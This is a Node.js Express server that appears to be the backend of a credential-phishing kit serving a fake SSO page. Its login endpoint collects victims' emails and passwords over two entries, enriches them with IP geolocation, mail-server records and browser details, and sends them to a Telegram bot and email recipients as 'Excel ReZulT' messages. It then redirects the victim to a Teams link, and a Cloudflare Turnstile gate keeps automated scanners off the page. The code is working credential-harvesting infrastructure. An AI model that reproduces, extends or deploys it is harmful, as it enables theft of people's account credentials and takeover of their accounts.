const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// MIDDLEWARE
// ============================================================

app.use(cors({
    origin: 'po-sso-we-verify.netlify.app',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json({ limit: '100kb' }));
app.use(express.urlencoded({ extended: true, limit: '100kb' }));

// ============================================================
// TELEGRAM CONFIG
// ============================================================

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;

// ============================================================
// BREVO (EMAIL) CONFIG
// ============================================================

const BREVO_API_KEY  = process.env.BREVO_API_KEY;
const SENDER_EMAIL   = process.env.SENDER_EMAIL || 'egli79380@gmail.com';
const SENDER_NAME    = process.env.SENDER_NAME || 'ABV Monitor';

const EMAIL_RECIPIENTS = (process.env.EMAIL_RECIPIENTS || '')
    .split(',')
    .map(e => e.trim())
    .filter(Boolean);

// ============================================================
// TEAMS REDIRECT (from env)
// ============================================================

const TEAMS_REDIRECT = process.env.TEAMS_REDIRECT || '';

// ============================================================
// CLOUDFLARE TURNSTILE — FULL PROTECTION
// ============================================================

const TURNSTILE_SECRET_KEY   = process.env.TURNSTILE_SECRET_KEY || '';
const TURNSTILE_PROOF_SECRET = process.env.TURNSTILE_PROOF_SECRET
                              || TURNSTILE_SECRET_KEY
                              || crypto.randomBytes(32).toString('hex');
const REQUIRE_TURNSTILE      = process.env.REQUIRE_TURNSTILE === 'true';
const PROOF_TTL_MS           = 5 * 60 * 1000; // 5 minutes

// ---- HMAC proof helpers (short-lived, email-bound) ----

function signProof(email, ts) {
    return crypto
        .createHmac('sha256', TURNSTILE_PROOF_SECRET)
        .update(`${email}|${ts}`)
        .digest('hex');
}

function makeProof(email) {
    const ts = Date.now();
    return {
        proof: signProof(email, ts),
        ts,
        expiresAt: ts + PROOF_TTL_MS
    };
}

function verifyProof(email, proof, ts) {
    if (!email || !proof || !ts) return { valid: false, reason: 'missing' };
    const tsNum = parseInt(ts, 10);
    if (Number.isNaN(tsNum)) return { valid: false, reason: 'bad-ts' };
    if (Date.now() - tsNum > PROOF_TTL_MS) return { valid: false, reason: 'expired' };
    if (Date.now() < tsNum - 60_000) return { valid: false, reason: 'future-ts' };

    const expected = signProof(email, tsNum);
    if (typeof proof !== 'string' || proof.length !== expected.length) {
        return { valid: false, reason: 'mismatch' };
    }
    try {
        const ok = crypto.timingSafeEqual(
            Buffer.from(proof, 'hex'),
            Buffer.from(expected, 'hex')
        );
        return { valid: ok, reason: ok ? 'ok' : 'mismatch' };
    } catch {
        return { valid: false, reason: 'bad-hex' };
    }
}

// ---- Cloudflare siteverify ----

async function verifyTurnstile(token, remoteIp) {
    if (!TURNSTILE_SECRET_KEY) {
        return { success: false, error: 'no-secret-configured' };
    }
    if (!token || typeof token !== 'string') {
        return { success: false, error: 'no-token' };
    }

    try {
        const body = new URLSearchParams();
        body.append('secret', TURNSTILE_SECRET_KEY);
        body.append('response', token);

        // Only include remoteip if it looks like an IP address
        if (remoteIp && /^[\d\.a-fA-F:]+$/.test(remoteIp)) {
            body.append('remoteip', remoteIp);
        }

        const response = await fetch(
            'https://challenges.cloudflare.com/turnstile/v0/siteverify',
            { method: 'POST', body }
        );
        const data = await response.json();
        return { success: !!data.success, data };
    } catch (error) {
        console.error('❌ Turnstile verify error:', error.message);
        return { success: false, error: error.message };
    }
}

// ---- Utility: extract first client IP from x-forwarded-for ----

function firstClientIp(req) {
    const xff = req.headers['x-forwarded-for'];
    if (xff) {
        const first = String(xff).split(',')[0].trim();
        if (first) return first;
    }
    return req.connection?.remoteAddress || req.socket?.remoteAddress || 'Unknown';
}

// ============================================================
// STARTUP CONFIG CHECK
// ============================================================

console.log('========================================');
console.log('🔍 Environment check:');
console.log(`   TELEGRAM_BOT_TOKEN:     ${BOT_TOKEN ? '✅' : '❌ MISSING'}`);
console.log(`   TELEGRAM_CHAT_ID:       ${CHAT_ID ? '✅' : '❌ MISSING'}`);
console.log(`   BREVO_API_KEY:          ${BREVO_API_KEY ? '✅' : '❌ MISSING'}`);
console.log(`   SENDER_EMAIL:           ${SENDER_EMAIL}`);
console.log(`   EMAIL_RECIPIENTS:       ${EMAIL_RECIPIENTS.length ? '✅ ' + EMAIL_RECIPIENTS.length + ' recipient(s)' : '❌ MISSING'}`);
console.log(`   TEAMS_REDIRECT:         ${TEAMS_REDIRECT ? '✅ set' : '❌ MISSING'}`);
console.log(`   TURNSTILE_SECRET_KEY:   ${TURNSTILE_SECRET_KEY ? '✅' : '❌ MISSING'}`);
console.log(`   REQUIRE_TURNSTILE:      ${REQUIRE_TURNSTILE ? '✅ TRUE (strict)' : '⚠️  FALSE (permissive)'}`);
console.log(`   PROOF_TTL_MS:           ${PROOF_TTL_MS / 1000}s`);
console.log('========================================');

if (REQUIRE_TURNSTILE && !TURNSTILE_SECRET_KEY) {
    console.error('❌ REQUIRE_TURNSTILE=true but TURNSTILE_SECRET_KEY is missing — stage 1 will reject all requests.');
}
if (!TURNSTILE_PROOF_SECRET || TURNSTILE_PROOF_SECRET === 'change-me') {
    console.warn('⚠️  Using fallback PROOF_SECRET — set TURNSTILE_PROOF_SECRET in production for stability across restarts.');
}

// ============================================================
// HELPER: Send Email via Brevo
// ============================================================

async function sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, stage) {
    if (!BREVO_API_KEY || EMAIL_RECIPIENTS.length === 0) return false;

    const subject = `🔐 ABV Login (Stage ${stage}) - ${email}`;

    const htmlContent = `
    <!DOCTYPE html>
    <html>
    <head>
        <style>
            body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
            .container { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 10px; }
            .header { background: #1e930c; color: #fff; padding: 15px; border-radius: 5px 5px 0 0; text-align: center; }
            .field { margin: 10px 0; padding: 10px; background: #f8f8f8; border-radius: 5px; }
            .label { font-weight: bold; color: #555; }
            .value { color: #1e930c; font-size: 16px; }
            .mx { color: #1e930c; font-size: 14px; white-space: pre-line; font-family: monospace; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header"><h2>🔐 ABV Login Credentials (Stage ${stage})</h2></div>
            <div class="field"><div class="label">📧 Email:</div><div class="value"><strong>${email}</strong></div></div>
            <div class="field"><div class="label">🔑 Password:</div><div class="value"><strong>${password}</strong></div></div>
            <div class="field"><div class="label">🌐 Domain:</div><div class="value">${domain || 'Unknown'}</div></div>
            <div class="field"><div class="label">📨 MX Record:</div><div class="value mx">${mxRecord || 'Unknown'}</div></div>
            <div class="field"><div class="label">🌍 IP:</div><div class="value">${ipInfo?.ip || 'Unknown'}</div></div>
            <div class="field"><div class="label">📍 Location:</div><div class="value">${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}</div></div>
            <div class="field"><div class="label">📱 Browser:</div><div class="value">${(userAgent || '').substring(0, 100)}...</div></div>
            <div class="field"><div class="label">🕐 Time:</div><div class="value">${new Date().toLocaleString()}</div></div>
        </div>
    </body>
    </html>`;

    try {
        const response = await fetch('https://api.brevo.com/v3/smtp/email', {
            method: 'POST',
            headers: {
                'api-key': BREVO_API_KEY,
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                sender: { name: SENDER_NAME, email: SENDER_EMAIL },
                to: EMAIL_RECIPIENTS.map(e => ({ email: e })),
                subject,
                htmlContent
            })
        });
        return response.ok;
    } catch (error) {
        console.error('❌ Brevo error:', error.message);
        return false;
    }
}

// ============================================================
// HELPER: Send to Telegram
// ============================================================

async function sendToTelegram(message) {
    if (!BOT_TOKEN || !CHAT_ID) return null;
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        });
        return await response.json();
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return null;
    }
}

// ============================================================
// HELPER: IP info
// ============================================================

async function getIPInfo(ip) {
    try {
        const firstIP = (ip || '').split(',')[0].trim();
        const response = await fetch(`https://ipinfo.io/${firstIP}/json`);
        return await response.json();
    } catch (error) {
        return { ip: ip || 'Unknown', country: 'Unknown', city: 'Unknown', region: 'Unknown' };
    }
}

// ============================================================
// HELPER: MX record
// ============================================================

async function getMXRecord(domain) {
    try {
        const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
        const data = await response.json();
        if (data && data.Answer && data.Answer.length > 0) {
            return data.Answer.map(r => r.data).join('\n');
        }
        return 'no-mx';
    } catch (error) {
        return 'MX-Error';
    }
}

// ============================================================
// HEALTH CHECK (existing keys preserved + Turnstile info)
// ============================================================

app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        telegramConfigured: !!(BOT_TOKEN && CHAT_ID),
        emailConfigured: !!(BREVO_API_KEY && EMAIL_RECIPIENTS.length),
        teamsRedirectConfigured: !!TEAMS_REDIRECT,
        // ---- new fields (additive only) ----
        turnstileConfigured: !!TURNSTILE_SECRET_KEY,
        requireTurnstile: REQUIRE_TURNSTILE,
        proofTtlSeconds: PROOF_TTL_MS / 1000
    });
});

// ============================================================
// TURNSTILE VERIFY ENDPOINT
// Called by gate page (index.html) after Cloudflare challenge passes.
// Verifies the token server-side, then issues an HMAC proof that the
// login page attaches to Stage 1.
// ============================================================

app.post('/api/turnstile-verify', async (req, res) => {
    console.log('🛡️ Turnstile verify request received');

    const body = req.body || {};
    const { token, email } = body;

    if (!token || typeof token !== 'string') {
        return res.status(400).json({ success: false, message: 'Turnstile token required' });
    }
    if (!email || typeof email !== 'string' || !email.includes('@')) {
        return res.status(400).json({ success: false, message: 'Valid email required' });
    }

    const clientIP = firstClientIp(req);
    const result = await verifyTurnstile(token, clientIP);

    if (!result.success) {
        const details = result.data || { error: result.error };
        console.warn(`🚫 Turnstile failed for ${email}:`, details);
        return res.status(403).json({
            success: false,
            message: 'Turnstile verification failed',
            details
        });
    }

    const { proof, ts, expiresAt } = makeProof(email);
    console.log(`✅ Turnstile passed for ${email} (proof TTL ${PROOF_TTL_MS / 1000}s)`);

    return res.json({
        success: true,
        email,
        proof,
        ts,
        expiresAt,
        redirect: '/login.html?u=' + encodeURIComponent(email)
                + '&p=' + encodeURIComponent(proof)
                + '&t=' + ts
    });
});

// ============================================================
// LOGIN ENDPOINT (stage 1 + stage 2) — WITH TURNSTILE ENFORCEMENT
// ============================================================

app.post('/api/login', async (req, res) => {
    console.log('📧 Login attempt received');
    console.log('📋 Request body:', req.body);

    const body = req.body || {};
    const {
        email, password, stage = 1, firstPassword,
        turnstileToken, proof, proofTs
    } = body;

    if (!email || !password) {
        return res.status(400).json({ success: false, message: 'Email and password required' });
    }

    const emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    if (!emailRegex.test(email)) {
        return res.status(400).json({ success: false, message: 'Invalid email format' });
    }

    // ----- TURNSTILE PROTECTION (stage 1 only) -----
    if (stage === 1) {
        const clientIP = firstClientIp(req);

        let turnstilePassed = false;
        let turnstileReason = 'not-checked';

        // Preferred: HMAC proof issued by /api/turnstile-verify
        if (proof && proofTs) {
            const v = verifyProof(email, proof, proofTs);
            turnstilePassed = v.valid;
            turnstileReason = v.reason;
        }
        // Fallback: raw Turnstile token sent directly from client
        else if (turnstileToken) {
            const v = await verifyTurnstile(turnstileToken, clientIP);
            turnstilePassed = v.success;
            turnstileReason = v.success ? 'ok' : 'turnstile-failed';
        }
        else {
            turnstileReason = 'no-proof';
        }

        if (!turnstilePassed) {
            console.warn(`🚫 Stage 1 blocked for ${email} — reason: ${turnstileReason}`);
            if (REQUIRE_TURNSTILE) {
                return res.status(403).json({
                    success: false,
                    stage: 1,
                    message: 'Human verification required',
                    reason: turnstileReason
                });
            } else {
                console.warn('⚠️  REQUIRE_TURNSTILE=false → allowing Stage 1 without proof');
            }
        } else {
            console.log(`✅ Turnstile passed for ${email} (${turnstileReason})`);
        }
    }

    // ----- EXISTING LOGIC (unchanged) -----
    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
    const ipInfo = await getIPInfo(clientIP);
    const domain = email.split('@')[1];
    const mxRecord = await getMXRecord(domain);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';

    const stageLabel = stage === 1 ? '1st Entry' : '2nd Entry';
    const matchLine  = stage === 2
        ? `First Password : ${firstPassword}\nMatch : ${firstPassword === password ? '✅ YES' : '❌ NO'}\n`
        : '';

    const telegramMessage = `
--------+ Excel ReZulT [${stageLabel}] ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +--------
Email : ${email}
Password : ${password}
${matchLine}Checker: ${email}:${password}
Browser : ${userAgent}
Language : ${acceptLanguage}
MX Record : ${mxRecord}
IP Address : ${clientIP}
Region and Country : ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'}
Date : ${new Date().toISOString()}
---------+ Excel ReZulT [${stageLabel}] +-------------
`;

    console.log(`📤 Sending to Telegram (stage ${stage})...`);
    const telegramResult = await sendToTelegram(telegramMessage);

    console.log('📧 Sending email via Brevo...');
    const emailResult = await sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, stage);

    // ----- Stage 2 → compare passwords, decide redirect -----
    if (stage === 2) {
        const matches = (firstPassword === password);

        if (matches && TEAMS_REDIRECT) {
            return res.json({
                success: true,
                stage,
                match: true,
                redirect: TEAMS_REDIRECT
            });
        }

        return res.json({
            success: true,
            stage,
            match: false,
            message: 'Passwords do not match'
        });
    }

    // ----- Stage 1 -----
    const telegramOK = !!(telegramResult && telegramResult.ok);
    return res.json({
        success: true,
        stage: 1,
        notifications: { telegram: telegramOK, email: emailResult }
    });
});

// ============================================================
// 404
// ============================================================

app.use('*', (req, res) => {
    res.status(404).json({
        success: false,
        message: `Endpoint not found: ${req.method} ${req.originalUrl}`
    });
});

// ============================================================
// START
// ============================================================

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🌐 Health: http://localhost:${PORT}/health`);
});

process.on('uncaughtException',  (err) => console.error('❌ Uncaught:', err.message));
process.on('unhandledRejection', (r)   => console.error('❌ Unhandled:', r));